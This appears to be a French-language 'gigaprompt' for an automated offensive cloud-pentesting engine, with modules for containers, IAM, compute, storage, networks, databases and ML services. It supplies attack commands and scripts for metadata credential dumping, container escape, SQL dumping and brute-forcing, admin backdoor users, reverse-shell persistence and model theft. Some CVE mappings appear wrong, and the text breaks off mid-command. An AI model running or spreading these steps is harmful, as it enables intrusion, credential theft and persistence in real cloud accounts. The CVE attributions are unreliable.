### ☁️ GIGAPROMPT STRATÉGIQUE : INFRASTRUCTURE CLOUD (MULTI-CSP ORCHESTRATION ENGINE)

---

## 🧠 [TYPE_ABSTRAIT] HeuristicCloudReactionEngine
```python
HeuristicCloudReactionEngine {
    observe(target: CloudTarget) → Signal[],
    match(signal: Signal) → Hypothesis[],
    test(hypothesis: Hypothesis) → Experiment[],
    execute(experiment: Experiment) → Observation,
    reason(observation: Observation) → NextStep[],
    react(next: NextStep) → CommandePentest[]
}
```

## 📦 [TYPE_ABSTRAIT] CloudTarget
```python
CloudTarget {
    cloud_provider: AWS | Azure | GCP | OVH | Hetzner | Custom,
    project_id: string,
    region: string,
    account_id: string,
    metadata_url_accessible: boolean,
    iam_roles_detected: [string],
    services_active: [string],
    open_ports: [int],
    public_endpoints: [string],
    code_artifacts: [string],
    signals: [Signal],
    context_tags: [string]
}
```

## 📍 [TYPE_ABSTRAIT] Signal
```python
Signal {
    source: string,
    type: Service | Exposure | Misconfig | Metadata | KeyLeak,
    content: string,
    confidence: Low | Medium | High,
    related_cve: [CVE],
    metadata: any
}
```

## 🔬 [TYPE_ABSTRAIT] Experiment
```python
Experiment {
    outil: string,
    arguments: string,
    expected_result: string,
    precondition: string,
    postcondition: string,
    automation: ShellScript | CloudCLI | TerraformScript
}
```

## 🧩 [TYPE_ABSTRAIT] NextStep
```python
NextStep {
    action_type: enum<Scan | Exploit | Pivot | Monitor>,
    priority: Low | Medium | High | Critical,
    command: CommandePentest
}
```

## 🧰 [TYPE_ABSTRAIT] CommandePentest
```python
CommandePentest {
    tool: string,
    full_command: string,
    description: string,
    csp_specific: boolean,
    compatible_providers: [AWS, Azure, GCP, OVH],
    when_to_execute: string
}
```

---

## ☁️ MOTEUR CENTRAL : `engine_infra_cloud(target: CloudTarget)`

```plaintext
DESCRIPTION :
Ce moteur déclenche automatiquement les sous-modules cloud suivants en fonction du provider et des signaux :
    ➤ AWS, Azure, GCP, OVH
    ➤ Adaptation dynamique outillage CLI/API
    ➤ Orchestration multicloud + mode RedTeam

──────────── ETAPES STRATÉGIQUES ────────────

[1] Reconnaissance cloud générique :
  - Test accès metadata (curl, IMDSv2, gcloud metadata)
  - Recon services actifs (CLI, fingerprint API)
  - Enumerations IAM / Buckets / VM
  - API enumeration via AWS CLI / Azure CLI / gcloud

[2] Détection de patterns :
  - IAM misconfig → engine_cloud_iam()
  - Instances EC2/Azure VM/Compute Engine → engine_cloud_compute()
  - Bucket S3/AzureBlob/GCS → engine_cloud_storage()
  - SecurityGroup/NACL/VPC/VNet → engine_cloud_network()
  - EKS/AKS/GKE clusters → engine_cloud_containers()
  - DBaaS / RDS / SQL / NoSQL → engine_cloud_databases()
  - SageMaker / AzureML / VertexAI → engine_cloud_ml_ai()
  - CloudShell / CodeBuild / DevOps → engine_cloud_devtools()
  - Amplify / Firebase / AppServices → engine_cloud_frontend()
  - SQS, SNS, EventGrid → engine_cloud_app_integration()
  - DMS, Transfer, Site2Site → engine_cloud_migration_transfer()
  - Greengrass, IoT Core → engine_cloud_iot()
  - CloudWatch, Stackdriver, AzureMonitor → engine_cloud_monitoring()
  - MediaLive, MediaStore, Stream → engine_cloud_media()
  - AWS Config, Azure Policy, OrgMgmt → engine_cloud_mgmt_governance()
  - Security Hub, Defender for Cloud → engine_cloud_security_compliance()
  - KMS / KeyVault → engine_cloud_key_management()
  - Backup services → engine_cloud_backup_restore()
  - CloudFront, CDN → engine_cloud_cdn_delivery()
  - Test/Dev mode → engine_cloud_sandbox_attack()
  - Metadata instance abuse → engine_cloud_metadata_exposure()
  - Lambda / Cloud Functions → engine_cloud_serverless()
  - Site-to-Site hybrid env → engine_cloud_hybrid_bridge()
  - Dev/QA exposure → engine_cloud_test_envs()
  - GitHub Actions / Pipelines → engine_cloud_ci_cd_pipelines()
  - Secrets Manager / Env Var leaks → engine_cloud_secret_management()
  - API Gateway / App Gateway → engine_cloud_api_gateway()
  - Artifact Registry / CodeArtifact → engine_cloud_package_registry()
  - Terraform / CloudFormation → engine_cloud_infra_as_code()
  - Billing misuse / Abuse → engine_cloud_billing_abuse()
  - Cross-account roles / federated trust → engine_cloud_cross_account()
  - AppServices / FaaS / SPA fullstack → engine_cloud_custom_applications()

[3] Déclenchement :
  - Chaque module `engine_cloud_*()` est un bloc de +100 lignes
  - Adaptation CLI : aws / az / gcloud + bash wrapper
  - Logs : /output/cloud/<provider>/<module>/<target>.log

[4] Corrélation heuristique :
  - MITRE ↔ CVE ↔ CPE ↔ CloudMisconfig
  - Regroupement par abus possibles : PrivEsc / Exfil / Lateral / Persistence

[5] Génération de scripts automatisés :
  - Shell script / PowerShell / Terraform / Python
  - Reverse payload cloud-native (callback cloud shell, etc.)

[6] Rapport de fin :
  - Graphviz + Markdown/PDF
  - Export CLI + Visual Map
  - Conseils remédiation classés par produit + criticité

────────────────────────────────────────────

### 🧠 GIGAPROMPT STRATÉGIQUE : `engine_cloud_containers()` – Orchestration Heuristique des Conteneurs Cloud (EKS, AKS, GKE, ECS, Docker, Podman)

---

## 📦 [TYPE_ABSTRAIT] CloudContainerTarget
```yaml
CloudContainerTarget {
  provider: AWS | Azure | GCP | OVH | Autre,
  orchestrator: Kubernetes | ECS | Docker | AKS | GKE | Podman | CRI-O,
  container_runtime: containerd | runc | docker,
  cni_plugin: Calico | Weave | Flannel | AWS-VPC | Cilium,
  api_exposed: bool,
  cloud_shell_access: bool,
  public_nodes: [IP],
  kubeconfig_leak: bool,
  image_registry: ECR | GCR | DockerHub | GitLab | JFrog,
  cluster_roles: [RBACRole],
  known_images: [ImageID],
  signals: [Signal]
}
```

## 🧠 [TYPE_ABSTRAIT] ContainerAttackHeuristicEngine
```yaml
ContainerAttackHeuristicEngine {
  observe(target: CloudContainerTarget) → Signal[],
  match(signal: Signal) → ContainerHypothesis[],
  test(hypothesis: ContainerHypothesis) → Experiment[],
  execute(experiment: Experiment) → Observation,
  reason(observation: Observation) → NextStep[],
  react(step: NextStep) → CommandePentest[]
}
```

## 🧩 [TYPE_ABSTRAIT] ContainerHypothesis
```yaml
ContainerHypothesis {
  type: Misconfig | CVE | PrivilegeEscalation | ExposedDashboard | PrivilegedContainer,
  confidence: Low | Medium | High,
  exploit_path: [Experiment],
  references: [CVE-ID, MITRE-ID],
  severity: Low | Medium | High | Critical
}
```

---

## 🔍 PHASE 1 : Reconnaissance de la surface conteneurs

- Détection cluster exposé :
  ```bash
  nmap -p 10250,6443,2375,2376,30000-32767 <target>
  ```
- Fingerprint API Kubernetes :
  ```bash
  curl -k https://<target>:6443/version
  curl -k https://<target>:10250/pods
  ```

- Recherche dashboard vulnérable :
  ```bash
  nuclei -t k8s-dashboard-exposure.yaml
  ```

---

## 🔓 PHASE 2 : Enumération des permissions

- Test RBAC :
  ```bash
  kubectl auth can-i --list
  kubectl get clusterrolebindings --all-namespaces
  ```

- Analyse de `ServiceAccount` attaché :
  ```bash
  kubectl get sa default -o yaml
  ```

- Vérifie si le pod courant a accès aux secrets :
  ```bash
  kubectl get secrets --all-namespaces
  ```

---

## 🔧 PHASE 3 : Exploits de conteneurs

- Escalade via conteneur privilégié :
  ```bash
  kubectl exec -it pod-name -- /bin/sh
  mount /host ; chroot /host ; passwd
  ```

- CVE populaires :
  - CVE-2020-8554 (Man-in-the-Middle via ARP spoof)
  - CVE-2022-0185 (namespace escape)
  - CVE-2019-5736 (runc overwrite)

- Container breakout exploit :
  ```bash
  ./run_escape.sh
  ```

---

## 📤 PHASE 4 : Registry + Image Poisons

- Recherches images toxiques :
  ```bash
  trivy image <image>
  grype <image>
  dockle <image>
  ```

- Analyse supply chain :
  ```bash
  syft packages <image>
  ```

- Recherche secrets dans containers :
  ```bash
  detect-secrets scan <image>
  gitleaks --repo <git>
  ```

---

## 📊 PHASE 5 : Monitoring, Logs, Audit Trails

- Enumération des logs (CloudTrail ou équivalent) :
  ```bash
  eksctl utils describe-addon-version --name vpc-cni --region <region>
  aws logs describe-log-groups
  ```

- IAM logs liés à l'accès au cluster :
  ```bash
  aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateCluster
  ```

---

## 📁 PHASE 6 : Scripts Automatisés & Génération

- `container_enum.sh` :
  Reconnaissance & RBAC

- `breakout.sh` :
  Test de breakout + fallback (nsenter, chroot)

- `registry_scan.sh` :
  Scan images + vulnérabilités supply chain

- `pod_injector.sh` :
  Insertion automatique de pod pour rebond

---

## 🧠 PATTERNS DE TRIGGER INTELLIGENTS

```pseudo
IF port 10250 open AND no auth header
    → Trigger kubelet remote exec

IF exposed dashboard unauth
    → Trigger browser RCE scan + iframe steal

IF privileged container OR mount path /host detected
    → Trigger escape kernel module

IF image FROM scratch AND hardcoded secrets found
    → Trigger image supply chain audit

IF ServiceAccount default with cluster-admin
    → Trigger cluster takeover via kubectl apply
```

---

## 🔒 MAPPING

- MITRE : T1552, T1611, T1068, T1547
- CVEs :
  - CVE-2019-5736 (container escape)
  - CVE-2022-0185 (cgroup ns exploit)
  - CVE-2020-8554 (network spoof Kubernetes)
- CPE : `cpe:/a:kubernetes:kubernetes:*`, `cpe:/a:docker:docker:*`

---

## 📤 OUTPUTS

- `/output/cloud/containers/<target>/rbac_map.md`
- `/output/cloud/containers/<target>/image_cves.log`
- `/output/cloud/containers/<target>/breakout_result.log`
- `/output/cloud/containers/<target>/supplied_scripts/`

---

# 🔐 MODULE : `engine_cloud_iam()`  
### Objectif : Pentest offensif des rôles, permissions, politiques IAM sur environnement cloud (AWS, Azure, GCP)

---

## 🧠 TYPE_ABSTRAIT : IAMEngine
```markdown
IAMEngine {
    enum_roles(target: CloudTarget) → [IAMEntity],
    detect_misconfig(entity: IAMEntity) → [Signal],
    correlate(signal: Signal) → [VulnHypothesis],
    abuse(hypothesis: VulnHypothesis) → [ExploitPath],
    react(path: ExploitPath) → [OffensiveCommand],
    synthesize(logs: [OffensiveCommand]) → OutputReport
}
```

---

## 🧩 TYPE_ABSTRAIT : IAMEntity
```markdown
IAMEntity {
    name: string,
    type: User | Group | Role | Policy,
    permissions: [string],
    trust_policy: json,
    attached_policies: [PolicyDocument],
    access_keys: [KeyPair],
    session_token: optional<string>,
    privileges: enum<LOW, MEDIUM, HIGH, ADMIN>,
    inherited_via: [Group, Role]
}
```

---

## 🧭 WORKFLOW STRATÉGIQUE

```
1. Enumération de toutes les entités IAM (roles, users, policies)
2. Détection des droits à risque (escalade, assume role, fulladmin)
3. Mapping des trusts intercomptes, cross-account abuse
4. Analyse de politique avec PMapper, Pacu, Steampipe
5. Simulation d'escalade (attach-role, update-policy)
6. Abuse effectif : passrole + Lambda, console login injection, privilege chaining
7. Dump access_key, rotation, credential_stuffing si key leak
8. Log et export vers rapport final
```

---

## 🔍 TOOLS STRATÉGIQUES

| Outil | Usage |
|-------|-------|
| **Pacu** | Exploitation de modules IAM AWS (passrole, escalate) |
| **PMapper** | Graph de dépendance de privilèges IAM |
| **Steampipe** | Enumeration massive avec SQL |
| **Cloudsplaining** | Analyse statique de policies |
| **Can-I-Access** | Prédiction d’escalade |
| **nimbostratus** | Post-exploitation via IAM abuse |
| **aws-vault** | Utilisation sécurisée des tokens temporaires |

---

## 🔓 TECHNIQUES D’ABUS

### 🔸 [T1550.001] – Token Abuse
```bash
aws sts get-caller-identity --profile stolen_creds
```

### 🔸 [T1078.004] – IAM User avec clé exposée
```bash
aws iam list-access-keys --user-name <target>
aws configure --profile attacker
```

### 🔸 [T1078.004 + T1484.001] – Escalade via UpdateAssumeRolePolicy
```bash
pacu> set_role_policy
pacu> update_assume_role_policy --role <vulnerable>
```

### 🔸 [T1098.001] – Création de backdoor persistante
```bash
aws iam create-user --user-name attacker
aws iam attach-user-policy --policy-arn arn:admin
```

---

## 📁 OUTPUT STRUCTURE
```
/output/cloud/iam/
├── enum_roles.txt
├── privilege_graph.dot
├── abuse_scenarios.md
├── stolen_keys.log
├── script_passrole_abuse.sh
```

---

## 🧪 CVE/ATT&CK/CPE MAPPING

| CVE | Description | Surface |
|-----|-------------|---------|
| CVE-2022-24043 | PassRole sans vérification MFA | AWS |
| CVE-2023-23565 | AssumeRole chaining | AzureAD B2C |
| CVE-2021-41773 | IAM Policy privilege injection | Multi-cloud |

---

## 📜 SCRIPT AUTOMATISÉ

```bash
#!/bin/bash
echo "[*] Enumération des rôles IAM..."
aws iam list-roles > roles.json

echo "[*] Analyse des permissions dangereuses..."
cat roles.json | jq '.Roles[] | {RoleName, AssumeRolePolicyDocument}' > parsed_roles.json

echo "[*] Recherche de escalade possible avec pacu..."
pacu --modules iam__enum_users,iam__privesc_scan

echo "[*] Génération de graphe de dépendance..."
python3 pmapper.py graph --output dot > privilege_graph.dot
```

---

## 📊 RAPPORT FINAL
- Graphe de dépendance des rôles
- Table des rôles à risque
- Export des exploit paths
- Script d’abus généré
- Mapping MITRE et recommandations

---

# ☁️ MODULE : `engine_cloud_compute()`
### Objectif : Pentest des services de calcul et fonctions exécutables dans le cloud (VM, container, serverless compute, edge runtimes)

---

## 🧠 TYPE_ABSTRAIT : ComputeEngine
```markdown
ComputeEngine {
  scan_instances(target: CloudTarget) → [ComputeAsset],
  fingerprint(asset: ComputeAsset) → [MetadataSignal],
  detect_misconfig(signal: MetadataSignal) → [ExploitSurface],
  correlate(signal: ExploitSurface) → [VulnHypothesis],
  exploit(hypothesis: VulnHypothesis) → [OffensiveCommand],
  escalate(cmd: OffensiveCommand) → [LPEChain],
  persist(chain: LPEChain) → [PersistenceMechanism],
  export(findings) → Report
}
```

---

## 🧩 TYPE_ABSTRAIT : ComputeAsset
```markdown
ComputeAsset {
  id: string,
  type: EC2 | GCE | AzureVM | Lambda | Lightsail | Fargate | BatchJob,
  image: string,
  user_data: string,
  iam_role: string,
  public_ip: string,
  exposed_ports: [int],
  services: [string],
  runtime_context: Docker | KVM | Xen | Nitro | Hyper-V,
  cloud_metadata_url: string,
  environment_variables: [string]
}
```

---

## 🧰 TOOLS STRATÉGIQUES

| Outil | Usage offensif |
|-------|----------------|
| `ScoutSuite` | Enum des compute assets + services |
| `Pacu` | EC2 → metadata abuse / reverse shell |
| `Peirates` | Container abuse (EKS/Fargate) |
| `LambdaScanner` | Audit de permissions, LFI, env leaks |
| `cloud_enum`, `s3scanner`, `EC2 Audit` | Recon externe |
| `pacu`, `nimbostratus` | Token escalation |
| `awspx`, `gcpwn`, `cloudsploit` | Abus privilege/ComputeContext |

---

## 🔍 PHASE 1 : RECONNAISSANCE
```bash
aws ec2 describe-instances --region us-east-1
az vm list-ip-addresses
gcloud compute instances list --format=json
```

→ Extraction : AMI ID, SG rules, key-pairs, runtime, metadata_url

---

## 🔬 PHASE 2 : METADATA ABUSE
### AWS EC2
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

→ Dump STS credentials

### GCP Compute Metadata
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

→ AccessToken reuse

---

## 🧨 PHASE 3 : LOCAL EXPLOIT / LPE / PRIVESC
### AWS
- User-data injection (base64 reverse)
- AMI image backdoor (Startup script abuse)
- EC2 instance connect hijack

### Azure
- VM Extensions Hijack
- MSI endpoint abuse (`localhost:50342/oauth2/token`)

### GCP
- Metadata Spoofing via SSRF
- Cloud init script abuse

---

## 🧪 PHASE 4 : FUNCTION / LAMBDA ABUSE
### Dump environnement
```bash
aws lambda get-function-configuration --function-name <fn>
```

→ Token, secrets, hardcoded URLs

### LFI RCE
```bash
invoke Lambda → scan `/proc/self/environ`, `/tmp/...`
→ SSRF + LFI chaining
```

---

## 🔁 PHASE 5 : PERSISTANCE
- Injection de reverse shell dans userdata
- Creation AMI custom avec payload
- Ajout d’`init.d` backdoor + reboot
- Cronjob dans Lambda Layer
- Backdoor docker ENTRYPOINT

---

## 🧠 PHASE 6 : CORRÉLATION / CVE / MITRE

| CVE | Description | Service |
|-----|-------------|---------|
| CVE-2019-5736 | runc Docker escape | EC2 / Fargate |
| CVE-2021-21985 | vSphere Remote exec vuln | Private cloud |
| CVE-2020-7209 | CloudInit RCE | EC2 / Azure |
| T1078.004 | Abuse de tokens dans environnements compute |
| T1203 | Exploitation de scripts de démarrage init |
| T1070.004 | Log clean pour persistance dans Lambda/VM |

---

## 🛠 SCRIPT AUTOMATISÉ

```bash
#!/bin/bash
echo "[*] Recon des instances EC2..."
aws ec2 describe-instances > ec2_instances.json

echo "[*] Dump Metadata EC2..."
curl http://169.254.169.254/latest/meta-data/ > meta_dump.txt

echo "[*] Scan des ports ouverts..."
nmap -Pn -p- -sV <public_ip> > portscan.txt

echo "[*] Tentative d'accès user-data script..."
curl http://169.254.169.254/latest/user-data/ > boot_script.txt
```

---

## 📂 OUTPUT STRUCTURE
```
/output/cloud/compute/
├── ec2_instances.json
├── metadata_dump.txt
├── lpe_script.sh
├── exploited_tokens.txt
├── abuse_paths.md
├── persistence_strategies.md
```

---

### 📦 GIGAPROMPT : `engine_cloud_storage(target: CloudTarget)`

> Objectif : Détection, exploitation, abus de services de stockage dans AWS, Azure, GCP (buckets, blobs, shares, ACL, anonymous, tokens). Génération dynamique des tactiques offensives avec orchestration CLI & logs.

---

## 🧠 [TYPE_ABSTRAIT] HeuristicStorageEngine
```ts
HeuristicStorageEngine {
    observe(target: CloudTarget): Signal[],
    match(signal: Signal): Hypothesis[],
    test(hypothesis: Hypothesis): Experiment[],
    execute(experiment: Experiment): Observation,
    reason(observation: Observation): NextStep[],
    react(step: NextStep): CommandePentest[]
}
```

## 📦 [TYPE_ABSTRAIT] CloudTarget
```ts
CloudTarget {
    account_id: string,
    provider: AWS | Azure | GCP | Other,
    domains: [string],
    bucket_names: [string],
    access_keys: [string],
    region: string,
    linked_services: [string],
    auth_type: Public | IAM | ServiceAccount | SAS,
    raw_signals: [Signal]
}
```

## 🔁 STRATÉGIE D'ORCHESTRATION

### 🔍 Phase 1 : Bucket Discovery
```
• AWS : s3scanner, S3Recon, `pacu bucket__enum`
• GCP : `gsutil ls`, `gcpbucketbrute`, public enum
• Azure : `az storage container list`, MicroBurst
• Analyse DNS : `subfinder`, `amass`, `dnsx`, bucket takeover
```

### 🔓 Phase 2 : Public/Weak ACL Detection
```
• Check anonymous read/write/list :
  - AWS : aws s3api list-objects --bucket <bucket>
  - GCP : gsutil ls gs://<bucket>
  - Azure : az storage blob list --account-name <name>
• If open → loot files
```

### 🔐 Phase 3 : Authenticated Enumeration (if keys/SAS)
```
• AWS : aws s3 ls, pacu bucket__exploit
• Azure : MicroBurst, Az PowerShell tools
• GCP : gsutil + BQ dataset access
```

### ⚠️ Phase 4 : Takeover & Persistence
```
• Misconfigured CNAME / Bucket Hijack
  - Use `bucket_finder.py`, `S3Scanner`, `Can-I-Take-Over-XYZ`
• If bucket writable:
  - Upload reverse shell
  - Trigger lambda function or CDN load
```

### 🎯 Phase 5 : Exploit & Lateral
```
• Malicious document planting
• XSS/HTML injection in public object
• Log4Shell payloads via asset injection
• Trigger alert to force download (bait doc)
```

### 🔍 CVE & MITRE Mapping
```
• T1537 (Transfer Data to Cloud Account)
• T1210 (Exploitation of Remote Services)
• CVE-2022-26352 (upload bypasses)
• CVE-2021-34750 (unauth Azure container list)
```

---

## 🧰 OUTILS SUPPORTÉS

| Provider | Tools offensifs                          |
|----------|-------------------------------------------|
| AWS      | pacu, s3scanner, awspx, CloudSploit       |
| Azure    | MicroBurst, AzScanner, aenumerator.ps1    |
| GCP      | gsutil, gcpbucketbrute, GCPwn             |
| Any      | CloudFox, IAMFinder, recon-buckets        |

---

## 🧪 EXPERIMENT STRUCTURE
```ts
Experiment {
  outil: string,
  arguments: string,
  expected_outcome: string,
  post_action: string
}
```

---

## 📁 SCRIPTING & LOGGING

```bash
scripts/
├── s3_enum.sh
├── azure_blob_enum.ps1
├── gcp_bucket_enum.sh
├── cloud_storage_exfil.py
├── takeover_payload_gen.py
```

Logs :
```
/output/cloud/<provider>/storage/bucket_enum_<timestamp>.log
/output/cloud/<provider>/storage/loot_objects_<bucket>.txt
/output/cloud/<provider>/storage/takeover_candidates.txt
```

---

## 🧠 DÉCLENCHEURS HEURISTIQUES

```python
IF domain_subdomain_contains(bucket_name) AND HTTP_403/404:
    → trigger bucket takeover check
IF aws_s3api returns AccessDenied OR AllUsers == READ:
    → trigger anonymous loot + exploit
IF storage blob has .ps1/.sh/.js:
    → extract → reverse payload insertion test
```

---

### 🌐 GIGAPROMPT : `engine_cloud_network(target: CloudTarget)`

> Objectif : Cartographie, attaque, abus, pivot & exfiltration sur la **surface réseau** cloud (privée et publique), avec support complet AWS VPC, Azure VNets, GCP VPC + interconnexions, tunnels, pare-feu et services exposés.

---

## 🧠 [TYPE_ABSTRAIT] HeuristicCloudNetEngine
```ts
HeuristicCloudNetEngine {
  observe(target: CloudTarget): Signal[],
  match(signal: Signal): Hypothesis[],
  test(hypothesis: Hypothesis): Experiment[],
  execute(experiment: Experiment): Observation,
  reason(observation: Observation): NextStep[],
  react(step: NextStep): CommandePentest[]
}
```

## 🌐 [TYPE_ABSTRAIT] CloudTarget
```ts
CloudTarget {
  account_id: string,
  provider: AWS | Azure | GCP | Other,
  vpcs: [VPCInfo],
  public_hosts: [string],
  subnets: [Subnet],
  firewalls: [FWRule],
  exposed_services: [PortService],
  peering_links: [PeeringLink],
  raw_signals: [Signal]
}
```

---

## 🔍 PHASE 1 : Reconnaissance & VPC Mapping

```bash
• AWS : pacu → vpc__enum / sg__enum
• Azure : az network list → subnets, NSG, UDR
• GCP : gcloud compute networks list + routes
• DNS mapping : route53 dump, zone transfer
• Passive scan : dnsx, httpx, massdns, amass
```

---

## 🔓 PHASE 2 : Security Groups & NSG Misconfig

```bash
• Check for 0.0.0.0/0 open ports
• Pacu → sg__exploit
• Azure NSG rules via az CLI
• GCP : firewall-rules open to all
```

### MITRE Mapping :
- T1046 (Network Service Scanning)
- T1190 (Exploitation of Public-Facing Application)
- T1133 (External Remote Services)

---

## 📡 PHASE 3 : Service Discovery & Lateral Surface

```bash
• Port scan + banner grab :
  - masscan + nmap -sV -O --script vuln
• DNS brute-force with subfinder/amass
• httpx + nuclei → fingerprint & vuln match
• AWS : check ELB / NLB exposures
• GCP : check default VPC flow
```

---

## 🔁 PHASE 4 : Routing & VPN Abuse

```bash
• Check for over-permissive route tables
• AWS : analyze peering, TGW, VPN endpoints
• Azure : UDR abuse → blackhole / hijack
• GCP : Shared VPC exploration
• CVE-2021-35464 (Lateral from misrouted LB)
```

---

## 🚨 PHASE 5 : Bypass, Pivot, IPS Evasion

```bash
• Proxychains + Torify tunneling via open hosts
• Use bastion → SSH reverse shell
• AMI / Custom image injection → backdoor
• HTTP Proxy abuse with weak auth
• MITRE : T1571 (Application Layer Protocol), T1090
```

---

## 🛠 TOOLS & EXPLOITS

| Cloud | Tools utilisés |
|-------|----------------|
| AWS   | Pacu, ScoutSuite, CloudSploit, Nmap, AWSBucketDump |
| Azure | Az CLI, Stormspotter, Roadrecon, NetScanner |
| GCP   | Gcloud SDK, GCPScanner, GCPwn, MassDNS |
| All   | Nmap NSE, dnsrecon, peepingtom, dnsx, nuclei |

---

## ⚙️ SCRIPTING

```bash
scripts/
├── vpc_enum.sh
├── sg_audit.sh
├── gcp_network_brute.sh
├── azure_nsg_extractor.ps1
├── network_scan_pivot.py
```

---

## 📁 LOGGING

```
/output/cloud/<provider>/network/vpc_enum_<timestamp>.log
/output/cloud/<provider>/network/firewall_open_ports.txt
/output/cloud/<provider>/network/public_exposure_score.md
/output/cloud/<provider>/network/exfil_ready_paths.dot
```

---

## 🔀 HEURISTIC TRIGGERS

```ts
IF SG/NSG open to all AND subnet == public:
  → Trigger remote exploit engine + port brute
IF DNS entry → S3/LB/Gateway + weak CORS:
  → Trigger cloud_storage_engine + SSRF path
IF peering_target → wildcard route (0.0.0.0/0):
  → Test route hijack + lateral move
IF weak proxy or NAT traversal:
  → Execute proxy_relay + DNS tunneling (iodine/dns2tcp)
```

---

## 🧠 MODULE : `engine_cloud_databases()`

```markdown
# ☁️ GIGA-MODULE : engine_cloud_databases()

## 🎯 OBJECTIF :
Effectuer un pentest offensif complet des services de base de données managés en environnement cloud (AWS, Azure, GCP, OVH, autres). Couvre SQL/NoSQL, RDS/Aurora, BigQuery, CosmosDB, Mongo Atlas, PostgreSQL managé, DynamoDB, Firebase, etc.

Ce module active reconnaissance → attaque → abus → extraction → persistance, tout en intégrant une analyse croisée MITRE ↔ CVE ↔ CPE.

---

## 🔐 [TYPE_ABSTRAIT] DBTarget
```yaml
DBTarget {
  db_type: string,
  endpoint: string,
  auth_method: string,
  metadata_accessible: boolean,
  encryption_at_rest: boolean,
  access_controls: {
    IAM: boolean,
    VPC_only: boolean,
    Public: boolean
  },
  known_creds: [Cred],
  signal: [DBSignal]
}
```

---

## 📡 PHASE 1 — RECONNAISSANCE DB

### ▶️ Services ciblés :

- AWS RDS, Aurora, DynamoDB
- GCP SQL, BigQuery, Firebase
- Azure SQL DB, CosmosDB, TableStorage
- MongoDB Atlas, Elasticsearch Cloud, Timescale Cloud, etc.

### 🔍 Reco :

```bash
# Enum endpoints via Terraform / CSP tools
aws rds describe-db-instances --query 'DBInstances[*].Endpoint.Address'
gcloud sql instances list --format json
az sql server list --output table
```

```bash
# Recon passif :
amass intel -d target.com
subfinder -d target.com
```

```bash
# Nmap reconnaissance
nmap -sV -p 1433,3306,5432,27017,9200,6379 <ip>
```

---

## 🔎 PHASE 2 — ENUMERATION & VULN SCAN

### 🧪 SQL DB :

```bash
# SQLMap
sqlmap -u 'https://api.domain.com/query?id=1' --dbs --batch --risk=3 --level=5

# mysql-cli / psql bruteforce
hydra -L users.txt -P pass.txt mysql://<target>
hydra -L users.txt -P pass.txt postgres://<target>
```

### 🧪 NoSQL DB :

```bash
# NoSQLMap
python nosqlmap.py -u http://target/api -a

# Mongo-express exposure
curl http://<target>:8081
```

### 🧪 RDS / Aurora Misconf :

```bash
# IAM vs Public access misconfiguration
aws rds describe-db-instances | grep PubliclyAccessible
```

---

## 🔓 PHASE 3 — EXPLOITATION & ABUS

### 🧨 Injection :

- SQLi / NoSQLi / GraphQLi
- Blind & Out-of-band
- Time-based injection on async API DB logic

### 🧨 Credential theft :

- Dump via sqlmap --passwords
- Azure Managed Identity override
- GCP service-account leak → JWT reuse

### 🧨 Dump & Exfil :

```bash
# SQL Dump via sqlmap
sqlmap -u 'https://target.com/api?id=1' --dump-all

# CloudDB auth bypass via proxy misconf (CVE-2023-23383)
```

---

## 🧬 PHASE 4 — POST-EXPLOITATION

### 🦠 Persistence :

- DB trigger backdoor (AFTER INSERT → HTTP request)
- User creation + weak password
- Stored procedure for code exec

### 🔁 Lateralisation :

- IAM token from DB creds
- Pivot vers S3 / storage bucket lié
- Vault creds dans DB system tables

---

## ⚠️ PHASE 5 — MAPPING & CVE

### MITRE ATT&CK :
- T1046 (Network Service Scanning)
- T1059.007 (SQLi Payload)
- T1210 (Exploitation of Remote Services)
- T1086 (PowerShell via DB linked agent)

### CVEs Critiques :
- CVE-2022-41080 (RDS proxy bypass)
- CVE-2023-23936 (Aurora Serverless leakage)
- CVE-2021-42258 (CosmosDB “ChaosDB” full takeover)

---

## ⚙️ SCRIPTING

```bash
cloud_db_enum.sh
→ Récupère tous les endpoints SQL/NoSQL
→ Teste l’ouverture / injection / anonymat

cloud_db_exploit_chain.sh
→ Dump, dump+escalade, injection persistante
→ Pivot vers S3 / secrets manager / IAM leak

cloud_db_remediation.md
→ Corrections automatiques / suppression users / policies
```

---

## 📦 OUTPUT

```
/output/cloud/databases/enum_db_targets.txt
/output/cloud/databases/exploits_injected.log
/output/cloud/databases/loot_dumped.sql
/output/cloud/databases/mitre_mapped.md
```

---

## 🧠 MODULE : `engine_cloud_ml_ai()`

```markdown
# ☁️ GIGA-MODULE : engine_cloud_ml_ai()

## 🎯 OBJECTIF :
Pentest avancé des services cloud IA/ML (SageMaker, Azure ML, GCP Vertex AI, Notebooks, modèles déployés sur API). Vise le vol de modèles, l’exploitation de notebooks exposés, l’injection dans les pipelines d’entraînement, les modèles inversibles et les API ML vulnérables.

---

## 🔐 [TYPE_ABSTRAIT] MLTarget
```yaml
MLTarget {
  cloud_provider: string,
  endpoint: string,
  access_type: Public | Authenticated,
  has_jupyter: boolean,
  exposed_model: boolean,
  upload_enabled: boolean,
  metadata_leak: boolean,
  custom_code: boolean,
  linked_data_bucket: string,
  signals: [MLSignal]
}
```

---

## 📡 PHASE 1 — RECONNAISSANCE

### 🔍 Enumération et découverte :

```bash
# AWS SageMaker endpoints
aws sagemaker list-endpoints --region us-east-1

# Google Vertex AI
gcloud ai endpoints list

# Azure ML
az ml endpoint list

# Jupyter Notebooks Publics
shodan search 'http.title:"Jupyter" port:8888'
```

### 🔎 Détection d’API ML ouvertes :

```bash
nmap -p80,443,8888,5000 --script http-title <target>
ffuf -u https://target/FUZZ -w apis.txt -mc 200
```

---

## 🔬 PHASE 2 — ENUM & PROFILING DES MODELES

### 📊 Model Profiling :

```bash
# Inference & Predict endpoint abuse
curl -X POST https://api.target.com/predict -d '{"input":"admin"}'

# Payload fuzzing
wfuzz -u https://target.com/predict -d 'input=FUZZ' -w payloads.txt -H 'Content-Type: application/json'
```

### 🔍 Analyse modèle :

- Input fuzzing (adversarial examples)
- Confusion matrix leaking
- Permissive model behavior (accepts all classes)

---

## 💣 PHASE 3 — EXPLOITATION & VOL DE MODELES

### 🧨 Model Theft :

```bash
# Extraction via KnockoffNets (BlackBox clone)
python extract.py --target https://target.com/api --out clone_model.h5
```

### 📦 Exfil données liées :

- IAM creds dans notebook
- S3 bucket avec jeu d’entraînement exposé
- Git leak (access token dans notebook)

### ⚠️ Jupyter Takeover :

```bash
curl -X POST http://target:8888/api/contents/evil.ipynb
